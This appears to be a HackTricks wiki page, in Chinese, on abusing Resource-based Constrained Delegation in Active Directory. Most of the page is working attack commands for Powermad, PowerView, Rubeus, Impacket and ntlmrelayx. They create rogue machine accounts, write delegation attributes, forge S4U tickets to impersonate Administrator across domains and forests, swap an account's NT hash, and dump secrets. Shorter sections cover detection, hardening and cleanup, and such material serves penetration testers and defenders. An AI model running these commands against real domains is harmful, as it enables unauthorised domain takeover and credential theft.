# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## RBCD 基础知识

Resource-based constrained delegation (RBCD) 与 [constrained delegation](constrained-delegation.md) 类似，但信任方向相反。传统 constrained delegation 会记录某个主体可以向哪些服务委派；RBCD 则会在**目标资源**上记录哪些主体可以代表用户访问该资源。<sup>[[12]](#references)</sup>

目标对象的 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性包含一个安全描述符，用于标识允许代表其他身份访问该资源的主体。

另一个重要区别是，对机器账户拥有足够**写入权限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty` 及类似权限）的主体，可能能够设置 _**msDS-AllowedToActOnBehalfOfOtherIdentity**_。配置传统 constrained delegation 通常需要更高权限的管理访问权限。<sup>[[1]](#references)</sup>

更准确地说，修改经典 constrained delegation 设置通常需要在域控制器上拥有 `SeEnableDelegationPrivilege`；通常只有高权限管理员才持有该权限。RBCD 将决策转移到目标对象的安全描述符，因此，对相关计算机对象属性拥有写入权限，就可能足够，而无需拥有该用户权限。<sup>[[1]](#references)[[2]](#references)</sup>

### 新概念

`userAccountControl` 中的 **`TrustedToAuthForDelegation`** 标志经常被描述为 **S4U2Self** 的前提条件，但这种说法并不完整。\
拥有 SPN 的服务主体无需该标志也可以请求 S4U2Self。设置 `TrustedToAuthForDelegation` 后，返回的服务票据是**可转发的**；未设置时，票据通常是**不可转发的**。<sup>[[5]](#references)</sup>

传统 constrained delegation 会在 S4U2Proxy 步骤拒绝**不可转发的 TGS**。如果目标的安全描述符授权了发起请求的服务，RBCD 则可以接受该 S4U2Self 票据。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 攻击流程

> 如果你对**计算机账户**拥有**相当于写入的权限**，就可能获得对该机器的特权访问权限。

假设攻击者已经对受害计算机对象拥有**相当于写入的权限**。

1. 攻击者**攻陷**一个拥有 **SPN** 的账户，或**创建一个账户**（“Service A”）。默认情况下，经过身份验证的域用户最多可以创建 10 个计算机对象，由 **_MachineAccountQuota_** 控制；计算机对象会自动提供可用的 SPN。
2. 攻击者滥用其对受害计算机（ServiceB）的 **WRITE 权限**，将**基于资源的约束委派配置为允许 ServiceA 代表任意用户访问该受害计算机**（ServiceB）。
3. 攻击者使用 Rubeus，从 Service A 到 Service B 执行一次**完整的 S4U 攻击**（S4U2Self 和 S4U2Proxy），目标用户是一个**有权访问 Service B 的特权用户**。
   1. S4U2Self（使用被攻陷或创建的 SPN 账户）：请求一个**代表 Administrator、面向 Service A 的 TGS**（不可转发）。
   2. S4U2Proxy：使用该**不可转发的 TGS**，请求一个代表 **Administrator**、面向**受害主机**的服务票据。
   3. 在此 RBCD 流程中，该不可转发票据仍可能有效，因为目标资源的安全描述符已授权 Service A。
4. 攻击者可以执行 **pass-the-ticket** 并**冒充**该用户，从而获得对受害 ServiceB 的**访问权限**。<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` 会关闭默认的计算机创建途径，但不会移除对目标计算机对象的写入权限，也不会影响对现有账户的控制。没有 SPN 的受控普通用户，有时也可以通过 [无 SPN 的 U2U 方法](#spn-less-cross-domain--cross-forest-rbcd) 充当委派主体，包括在同一域内。该途径仍需要有效的 RBCD 写入权限、对委派用户凭据的控制、可委派的被冒充身份、兼容的 Kerberos 加密行为，以及会干扰账户的 NT 哈希变更。应将这些视为独立的前提条件；RBCD 属性为空或配额为零，都不能单独证明攻击成功或环境安全。

现有的 RBCD 描述符也可以指定一个**组**，而不是直接指定委派计算机。如果你控制一个带有 SPN 的计算机账户，并且可以将其加入该组，那么新增的组成员关系可能提供委派路径，而无需更改目标计算机的 RBCD 属性。在判断这条路径是否有效之前，请检查该组的有效成员写入 ACL（包括 deny ACE）、嵌套成员关系和令牌刷新、描述符中的受信任方 SID、被冒充账户的委派限制，以及目标服务 SPN。

要检查域的 _**MachineAccountQuota**_，可以使用：

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 攻击

### 创建计算机对象

你可以使用 **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> 在域内创建计算机对象。

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### 配置 Resource-based Constrained Delegation

**使用 Active Directory PowerShell 模块**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**使用 powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 执行完整的 S4U 攻击（Windows/Rubeus）

首先，我们使用密码 `123456` 创建了新的 Computer 对象，因此需要获取该密码的哈希值：<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

这将打印该账户的 RC4 和 AES 哈希。\
现在可以执行攻击：<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

通过 Rubeus 的 `/altservice` 参数，只需请求一次即可为更多服务生成更多票据：

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> 用户可以被标记为 **“Account is sensitive and cannot be delegated.”**。启用此标志后，无法通过此委派流程冒充该账户。BloodHound 会在分析期间显示此属性。

### Linux 工具：使用 Impacket 完整执行 RBCD（2024 年及以后）

如果你在 Linux 环境中操作，可以使用官方 Impacket 工具完成完整的 RBCD 攻击链：<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

备注
- 如果强制要求 LDAP signing/LDAPS，请使用 `impacket-rbcd -use-ldaps ...`。
- 优先使用 AES 密钥；许多现代域会限制 RC4。Impacket 和 Rubeus 都支持仅使用 AES 的流程。
- Impacket 可以为某些工具重写 `sname`（"AnySPN"），但只要可能，就应获取正确的 SPN（例如 CIFS/LDAP/HTTP/HOST/MSSQLSvc）。

## 跨域与跨林 RBCD

如果你控制的**委派主体**位于与**资源计算机**不同的**域**（甚至不同的**林**），滥用方式仍然是 **RBCD**，但票据流程不再是常见的单域 `S4U2Self -> S4U2Proxy`。

### 跨域 RBCD：通过 SID 配置外部主体

从**不同的域**设置 `msDS-AllowedToActOnBehalfOfOtherIdentity` 时，目标域 LDAP 可能**无法按名称解析**外部计算机/用户。此时，请使用外部主体的 **SID** 配置委派条目，而不是其 sAMAccountName/UPN。

这在将 NTLM 中继到 LDAP 时尤其相关，具体使用 `ntlmrelayx.py`：<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

注：
- `--sid` 会告诉 `ntlmrelayx.py` 将 `--escalate-user` 视为 SID；当委派账户属于目标域之外时，这是必需的。
- 即使工具输出 `User not found in LDAP`，委派权限写入仍可能成功，因为安全描述符会直接存储外部 SID。

### 跨域 RBCD：跨 realm S4U 流程

将外部主体添加到 `msDS-AllowedToActOnBehalfOfOtherIdentity` 后，可用的跨域流程如下：<sup>[[9]](#references)[[13]](#references)</sup>

1. 从委派主体所属的域获取 **TGT**。
2. 请求 `krbtgt/<target-domain>` 的 **referral TGT**。
3. 在目标域 DC 上，为要模拟的用户请求 **cross-realm S4U2Self referral**。
4. 回到委派主体所在的域，为该用户请求实际的 **S4U2Self** ticket。
5. 在委派主体所在的域执行 **S4U2Proxy**，获取目标域的 referral ticket。
6. 在目标域 DC 上执行最后一次 **S4U2Proxy**，获取 `cifs/host.target`、`host/host.target` 等服务的 service ticket。

这就是 stock Linux tooling 经常无法处理跨域 RBCD 的原因：<sup>[[9]](#references)</sup>
- 请求的 **realm** 可能需要与 `TGS-REQ` 中所用 TGT 的 realm 不同
- 流程需要**彼此独立的 S4U2Proxy 步骤**，而不能只执行 `S4U2Self`，或紧接着 `S4U2Self` 只执行一次 `S4U2Proxy`

### 从 Linux 执行跨域 RBCD

Synacktiv 发布了一个 Impacket `getST.py` 实现，可通过显式处理两个 KDC，从 Linux 重现跨 realm 流程：<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

在实际操作中，新增的参数为：
- `-dc-ip`：**委派**域的 DC
- `-targetdomain`：**资源计算机**所属的域
- `-targetdc`：**资源**域的 DC

### 跨林 RBCD 的限制

跨林 RBCD 有一项重要限制：**被冒充的用户必须与委派主体属于同一个林**。换句话说，如果你控制的机器帐户位于 `valhalla.local`，而目标资源位于 `asgard.local`，通常**无法**通过 RBCD 冒充任意 `asgard.local` 用户访问该资源。<sup>[[9]](#references)</sup>

以下情况仍可利用：
- **委派林**中的用户是另一林资源主机上的**本地管理员**（或拥有其他特权）
- 信任关系允许所需的身份验证路径，且目标计算机的安全描述符接受外部 SID

### 跨林 RBCD 的协议细节

跨林 RBCD 并不只是“跨域加上信任关系”。观察到的流程包含两个常见工具长期以来会遗漏的细节：<sup>[[9]](#references)</sup>

1. 额外发送一个设置了 **`PA-PAC-OPTIONS=branch-aware`** 的 **S4U2Proxy** 请求
2. 最终服务票证可能会以 **RC4** 返回，即使请求了其他 etype

实际流程如下：

1. 获取林 A 中委派主体的 TGT。
2. 在林 A 中为被冒充的用户请求 **S4U2Self**。
3. 在林 A 中请求 **S4U2Proxy**，以获取林 B 的转介 TGT。
4. 在林 A 中再次发送 **S4U2Proxy**，**不**将 S4U2Self 票证作为附加票证，但启用 `branch-aware`，以获取另一个林 B 的转介 TGT。
5. 可选：在林 B 中为委派主体请求普通服务票证（最终利用并不需要此票证）。
6. 使用步骤 3 和 4 获取的转介票证，在林 B 中请求最终的 **S4U2Proxy** 票证，让被冒充的林 A 用户访问目标 SPN。

### 从 Linux 进行跨林 RBCD

同一 Synacktiv Impacket 分支为此逻辑添加了 `-forest` 开关：<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 递归多域 RBCD（3+ 个域）

在**多域林**中，**S4U2Self** 和 **S4U2Proxy** 都可以**递归**执行，而不是在一次 referral 后停止：

- **递归 S4U2Self**：第一个 `S4U2Self` 会发送到**被模拟用户所在的域**，然后通过针对 `krbtgt/<REALM>` 的常规 `TGS-REQ` referral 遍历中间的父子域跳转，最后一个 `S4U2Self` 则发送到**委派主体自己的域**。
- 这意味着，**只要持有**某个机器账户的 **TGT**，就可能足以模拟同一林中另一个域的**管理员**，并请求 `cifs/host`、`host/host`、`wsman/host` 等。
- **递归 S4U2Proxy** 也会以相同方式沿着信任链进行：中间跳转会将前一个票据作为 TGT 重用，同时请求下一个 `krbtgt/<REALM>` referral，只有最后一个跳转会返回最终的服务票据。<sup>[[10]](#references)</sup>

一个实用的同林示例如下：

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### 无 SPN 的跨域 / 跨林 RBCD

如果**委派主体是没有 SPN 的用户**，最后一次递归 `S4U2Self` 会失败，并返回 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**。解决方法是**仅将最后一跳重试为 `S4U2Self+U2U`**。<sup>[[10]](#references)</sup>

滥用链简述：

1. 使用 **NT hash** 进行身份验证，促使 KDC 使用 **RC4-HMAC (etype 23)**。
2. 先请求 **`-self -u2u`**，并将此票据与后续的代理步骤分开保存。
3. 使用 `describeTicket.py` 提取 **TGT 会话密钥**。
4. 使用 `changepasswd.py -newhashes <session_key>` 将用户的 **NT hash** 替换为该**会话密钥**。
5. 在单独的 **`-proxy`** 请求中，将 `S4U2Self+U2U` 票据作为 **`-additional-ticket`** 使用。

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

操作注意事项：

- 当**第一个受信任跳点已经是另一个林**时，优先使用**branch-aware**算法（`getST.py ... -forest`），以匹配 Windows 原生行为。如果外部林仅在链路的**后续阶段**才会到达，非 branch-aware 的递归流程仍可能有效。<sup>[[9]](#references)</sup>
- 在较新的 **Windows Server 2022/2025** DC 上，由于 RC4 已弃用，强制使用 RC4 可能会因 **`KDC_ERR_ETYPE_NOSUPP`** 而失败；这可能导致**不依赖 SPN 的 RBCD**无法实现，即使依赖经典 SPN 的 RBCD 仍可使用 AES 正常工作。<sup>[[15]](#references)</sup>
- 更改用户的哈希/密码之前，先运行 **`S4U2Self+U2U`**：`SamrChangePasswordUser` **不会重新计算账户的 Kerberos AES 密钥**，因此先更改密码可能导致后续票据请求失败。<sup>[[14]](#references)</sup>
- 被模拟的账户仍必须**允许委派**：**Protected Users** 和设置了 **`NOT_DELEGATED`** / **“Account is sensitive and cannot be delegated”** 的账户会阻断该链路。

## 检测 / 加固注意事项

- 跨域/跨林的 RBCD 路径通常仍通过 **ACL 滥用**或 **relay-to-LDAP** 创建。在 DC 上启用 **LDAP signing** 和 **LDAP channel binding**，以阻断常见的配置路径。
- 审计哪些主体可以在计算机对象上写入 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并解析其中存储的 SID，包括**外部安全主体**。
- 在信任关系较多的环境中，检查 **Selective Authentication**、**SID filtering**，以及来自外部林的用户是否在资源主机上拥有**本地管理员**权限。

### 访问

最后一条命令行会执行**完整的 S4U 攻击**，并将从 Administrator 获取的 TGS **注入受害主机的内存**。\
在此示例中，请求的是 Administrator 的 **CIFS** 服务 TGS，因此你将能够访问 **C$**：

```bash
ls \\victim.domain.local\C$
```

### 滥用不同的服务票据

了解[**此处提供的服务票据**](silver-ticket.md#available-services)。

## 枚举、审计和清理

### 枚举已配置 RBCD 的计算机

PowerShell（解码 SD 以解析 SID）：

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket（使用一条命令读取或刷新）：

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### 清理 / 重置 RBCD

- PowerShell（清除该属性）：

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos 错误

- **`KDC_ERR_ETYPE_NOTSUPP`**：这表示 Kerberos 配置为不使用 DES 或 RC4，而你只提供了 RC4 hash。至少向 Rubeus 提供 AES256 hash（或同时提供 rc4、aes128 和 aes256 hashes）。示例：`[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 对普通用户执行 `-self` 时出现 **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**：委派主体可能**没有 SPN**。请尝试将**最后一跳**改为 **`S4U2Self+U2U`**，而非常规的 `S4U2Self`。<sup>[[10]](#references)</sup>
- **SPN-less RBCD** 期间出现 **`KDC_ERR_ETYPE_NOSUPP`**：较新的 DC 可能会拒绝 **`S4U2Self+U2U`** 与 session-key-substitution 技巧所需的强制 **RC4-HMAC** 路径。请尝试改用 AES 的经典 **SPN-backed** RBCD 路径。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**：这表示当前计算机的时间与 DC 的时间不同，因此 Kerberos 无法正常工作。
- **`preauth_failed`**：这表示给定的用户名和 hashes 无法用于登录。生成 hashes 时，你可能忘记在用户名中加上 "$"（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）
- **`KDC_ERR_BADOPTION`**：可能表示：
  - 你试图冒充的用户无法访问所需服务（因为你不能冒充该用户，或该用户权限不足）
  - 请求的服务不存在（例如请求 winrm 的票据，但 winrm 未运行）
  - 创建的 fakecomputer 已失去对易受攻击服务器的权限，你需要恢复这些权限。
  - 你正在滥用经典 KCD；请记住，RBCD 可使用 non-forwardable S4U2Self tickets，而 KCD 要求 forwardable。

## 注意事项、中继与替代方案

- 如果 LDAP 被过滤，你也可以通过 AD Web Services (ADWS) 写入 RBCD SD。参见：


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay 链通常会以 RBCD 结束，从而一步获得本地 SYSTEM。参见以下端到端实战示例：


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- 如果 LDAP signing/channel binding **已禁用**，且你能够创建 machine account，那么像 **KrbRelayUp** 这样的工具可以将被强制触发的 Kerberos auth 中继到 LDAP，在目标计算机对象上为你的 machine account 设置 `msDS-AllowedToActOnBehalfOfOtherIdentity`，并立即通过 S4U 从主机外冒充 **Administrator**。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog：滥用基于资源的约束委派攻击 Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [关于委派的另一种说法 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos 基于资源的约束委派：接管计算机对象](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – 基于资源的约束委派滥用](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity 毁掉了域：Kerberos 攻击概述](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（官方）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [包含最新语法的 Linux 快速备忘单](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（LDAP signing 关闭 → Kerberos relay 到 RBCD）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - 探索跨域和跨林 RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - 探索跨域和跨林 RBCD：第 2 部分](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket 分支 - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos 约束委派概述](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - 跨域 S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - 检测和修复 Kerberos 中的 RC4 使用情况](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxy 详细信息](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
